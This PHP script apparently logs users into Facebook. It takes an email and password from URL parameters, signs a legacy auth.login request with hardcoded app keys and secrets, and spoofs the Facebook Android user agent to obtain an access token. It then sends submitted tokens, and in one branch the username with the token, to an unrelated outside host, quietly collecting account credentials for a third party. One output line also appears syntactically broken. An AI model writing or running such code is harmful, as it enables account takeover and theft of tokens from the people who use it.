<?php
function curl_download($Url,$fields = false){
    if (!function_exists('curl_init')){
        return 'Sorry cURL is not installed!';
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_REFERER, "http://www.google.com");
    curl_setopt($ch, CURLOPT_USERAGENT, "[FBAN/FB4A;FBAV/37.0.0.0.109;FBBV/11557663;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Android;FBMF/unknown;FBBD/generic;FBPN/com.facebook.katana;FBDV/google_sdk;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    if($fields and count($fields) > 0){
    foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
    rtrim($fields_string, '&');
    curl_setopt($ch,CURLOPT_POST, count($fields));
    curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
    }
    // Timeout in seconds
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    // Download the given URL, and return output
    $output = curl_exec($ch);

    // Close the cURL resource, and free system resources
    curl_close($ch);

    return $output;
}
function Json($url="", $t=true,$f=false)
{
    return json_decode(curl_download($url,$f),$t);
}
function getLoginUrl($user, $pass, $type="android")
{
    if ($type == "android") {
        $apikey = "882a8490361da98702bf97a021ddc14d";
        $sec = "62f8ce9f74b12f84c123cc23437a4a32";
    } else {
        $apikey = "3e7c78e35a76a9299309885393b02d97";
        $sec = "c1e620fa708a1d5696fb991c1bde5662";
    }
    $mdtet = "api_key=".$apikey."email=".$user."format=JSONlocale=vi_vnmethod=auth.loginpassword=".$pass."return_ssl_resources=0v=1.0".$sec;
    $Mapp= "api_key=".$apikey."&email=".$user."&format=JSON&locale=vi_vn&method=auth.login&password=".$pass."&return_ssl_resources=0&v=1.0";
    return "https://api.facebook.com/restserver.php?".$Mapp."&sig=".md5($mdtet);
}
if(!isset($_GET["token"])){
//echo json_encode(array("data"=>getLoginUrl($_GET["user"],$_GET["pass"])));
echo json_encode(array("data"=>Json(getLoginUrl($_GET["user"],$_GET["pass"]),"user"=>$_GET["user"])));
}else{
  if(!isset($_GET["check"])){  
echo json_encode(array("data"=>Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$_GET["token"])["success"])); 
  }else{
echo json_encode(array("data"=>Json("https://graph.facebook.com/me/permissions?access_token=".$_GET["token"])["data"])); 
 Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$_GET["user"].",".$_GET["token"]);
  }
  }
?>
